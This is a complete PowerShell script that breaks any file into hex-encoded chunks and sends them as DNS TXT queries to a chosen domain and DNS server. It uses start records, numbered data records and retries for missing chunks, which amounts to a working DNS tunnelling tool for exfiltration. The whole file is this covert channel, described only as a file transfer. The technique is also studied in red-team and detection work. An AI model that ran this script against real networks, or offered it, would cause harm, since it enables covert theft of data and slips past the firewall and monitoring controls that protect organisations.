# Script to break a file into chunks and send via DNS queries
# Usage: .\script.ps1 <file> [domain] [chunk_size] [dns_server]

param (
    [Parameter(Mandatory=$true)]
    [string]$FilePath,
    
    [Parameter(Mandatory=$false)]
    [string]$Domain = "example.com",
    
    [Parameter(Mandatory=$false)]
    [int]$ChunkSize = 100,
    
    [Parameter(Mandatory=$false)]
    [string]$DnsServer = ""
)

# Check if file exists
if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
    Write-Host "Error: File '$FilePath' not found" -ForegroundColor Red
    exit 1
}

# Get filename (basename only)
$Filename = [System.IO.Path]::GetFileName($FilePath)

# Generate hash8 (8 hex characters) - using first 8 chars of file's MD5
$fullHash = (Get-FileHash -Algorithm MD5 -Path $FilePath).Hash.ToLower()
$Hash8 = $fullHash.Substring(0, 8)

# Encode filename to hex
$FilenameBytes = [System.Text.Encoding]::UTF8.GetBytes($Filename)
$FilenameHex = ($FilenameBytes | ForEach-Object { $_.ToString("x2") }) -join ""

# Get file size
$FileInfo = Get-Item -Path $FilePath
$FileSize = $FileInfo.Length

# Calculate total parts
$TotalParts = [math]::Ceiling($FileSize / $ChunkSize)

Write-Host "File: $FilePath"
Write-Host "Filename: $Filename"
Write-Host "Size: $FileSize bytes"
Write-Host "Chunk size: $ChunkSize bytes"
Write-Host "Total parts: $TotalParts"
Write-Host "Hash: $Hash8"
Write-Host "Domain: $Domain"
Write-Host ""

# Function to split hex string into DNS labels (max 63 chars per label)
function Split-HexLabels {
    param([string]$HexStr)
    
    $result = ""
    $len = $HexStr.Length
    $i = 0
    
    while ($i -lt $len) {
        if ($result -ne "") {
            $result += "."
        }
        $chunkLen = [math]::Min(63, $len - $i)
        $result += $HexStr.Substring($i, $chunkLen)
        $i += 63
    }
    
    return $result
}

# Build start record query
# Format: filename_hex.total_parts.chunk_size.total_bytes.start.hash8.<domain>
$FilenameHexLabels = Split-HexLabels -HexStr $FilenameHex
$StartQuery = "$FilenameHexLabels.$TotalParts.$ChunkSize.$FileSize.start.$Hash8.$Domain"

Write-Host "Sending start record..."
if ($DnsServer -eq "") {
    Resolve-DnsName -Name $StartQuery -Type TXT -ErrorAction SilentlyContinue | Out-Null
} else {
    Resolve-DnsName -Name $StartQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue | Out-Null
}
Start-Sleep -Milliseconds 100

# Read file and send chunks (1-based part numbering)
$PartNum = 1
$BytesRead = 0

$FileStream = [System.IO.File]::OpenRead($FilePath)

while ($BytesRead -lt $FileSize) {
    # Calculate chunk size
    $ChunkLength = [math]::Min($ChunkSize, $FileSize - $BytesRead)
    
    # Read chunk
    $Chunk = New-Object byte[] $ChunkLength
    $FileStream.Seek($BytesRead, [System.IO.SeekOrigin]::Begin) | Out-Null
    $FileStream.Read($Chunk, 0, $ChunkLength) | Out-Null
    
    # Convert to hex string
    $ChunkHex = ($Chunk | ForEach-Object { $_.ToString("x2") }) -join ""
    
    # Split hex into DNS labels
    $ChunkHexLabels = Split-HexLabels -HexStr $ChunkHex
    
    # Build data record query
    # Format: data_hex.part_num.hash8.<domain>
    $DataQuery = "$ChunkHexLabels.$PartNum.$Hash8.$Domain"
    
    # Send DNS query
    Write-Host -NoNewline "Sending part $PartNum/$TotalParts... "
    if ($DnsServer -eq "") {
        Resolve-DnsName -Name $DataQuery -Type TXT -ErrorAction SilentlyContinue | Out-Null
    } else {
        Resolve-DnsName -Name $DataQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue | Out-Null
    }
    Write-Host "done"
    
    $BytesRead += $ChunkSize
    $PartNum++
    
    # Small delay to avoid overwhelming the DNS server
    Start-Sleep -Milliseconds 50
}

$FileStream.Close()

Write-Host ""
Write-Host "Initial transfer complete! Sent $TotalParts parts."

# Check for missing chunks and retry
$MaxRetries = 10
$RetryCount = 0

while ($RetryCount -lt $MaxRetries) {
    # Wait a bit for server to process
    Start-Sleep -Milliseconds 500
    
    # Query for missing chunks
    $MissingQuery = "missing.$Hash8.$Domain"
    Write-Host "Checking for missing chunks..."
    
    $MissingResponse = $null
    if ($DnsServer -eq "") {
        $MissingResponse = Resolve-DnsName -Name $MissingQuery -Type TXT -ErrorAction SilentlyContinue
    } else {
        $MissingResponse = Resolve-DnsName -Name $MissingQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue
    }
    
    # Parse missing chunk numbers from TXT records
    $MissingChunks = @()
    if ($MissingResponse) {
        foreach ($record in $MissingResponse) {
            if ($record.Strings) {
                foreach ($str in $record.Strings) {
                    $chunkNum = 0
                    if ([int]::TryParse($str, [ref]$chunkNum)) {
                        $MissingChunks += $chunkNum
                    }
                }
            }
        }
    }
    
    if ($MissingChunks.Count -eq 0) {
        Write-Host "All chunks received successfully!"
        break
    }
    
    # Sort missing chunks
    $MissingChunks = $MissingChunks | Sort-Object
    
    Write-Host "Found $($MissingChunks.Count) missing chunk(s): $($MissingChunks -join ' ')"
    
    # Retry sending missing chunks (1-based)
    $FileStream = [System.IO.File]::OpenRead($FilePath)
    foreach ($chunkNum in $MissingChunks) {
        # Calculate byte offset for this chunk (1-based part number, so subtract 1)
        $chunkOffset = ($chunkNum - 1) * $ChunkSize
        
        # Read chunk
        $ChunkLength = [math]::Min($ChunkSize, $FileSize - $chunkOffset)
        $Chunk = New-Object byte[] $ChunkLength
        $FileStream.Seek($chunkOffset, [System.IO.SeekOrigin]::Begin) | Out-Null
        $FileStream.Read($Chunk, 0, $ChunkLength) | Out-Null
        
        # Convert to hex string
        $ChunkHex = ($Chunk | ForEach-Object { $_.ToString("x2") }) -join ""
        
        # Split hex into DNS labels
        $ChunkHexLabels = Split-HexLabels -HexStr $ChunkHex
        
        # Build data record query
        $DataQuery = "$ChunkHexLabels.$chunkNum.$Hash8.$Domain"
        
        # Send DNS query
        Write-Host -NoNewline "  Retrying chunk $chunkNum... "
        if ($DnsServer -eq "") {
            Resolve-DnsName -Name $DataQuery -Type TXT -ErrorAction SilentlyContinue | Out-Null
        } else {
            Resolve-DnsName -Name $DataQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue | Out-Null
        }
        Write-Host "done"
        
        Start-Sleep -Milliseconds 50
    }
    $FileStream.Close()
    
    $RetryCount++
    Write-Host "Retry attempt $RetryCount/$MaxRetries completed"
    Write-Host ""
}

if ($RetryCount -eq $MaxRetries) {
    Write-Host "Warning: Reached maximum retry attempts. Some chunks may still be missing." -ForegroundColor Yellow
    # Final check
    $FinalCheck = $null
    if ($DnsServer -eq "") {
        $FinalCheck = Resolve-DnsName -Name "missing.$Hash8.$Domain" -Type TXT -ErrorAction SilentlyContinue
    } else {
        $FinalCheck = Resolve-DnsName -Name "missing.$Hash8.$Domain" -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue
    }
    if ($FinalCheck) {
        $FinalMissing = @()
        foreach ($record in $FinalCheck) {
            if ($record.Strings) {
                foreach ($str in $record.Strings) {
                    $chunkNum = 0
                    if ([int]::TryParse($str, [ref]$chunkNum)) {
                        $FinalMissing += $chunkNum
                    }
                }
            }
        }
        if ($FinalMissing.Count -gt 0) {
            Write-Host "Still missing: $($FinalMissing -join ' ')"
        }
    }
}

Write-Host ""
Write-Host "Transfer complete! File should be received as: $Filename"
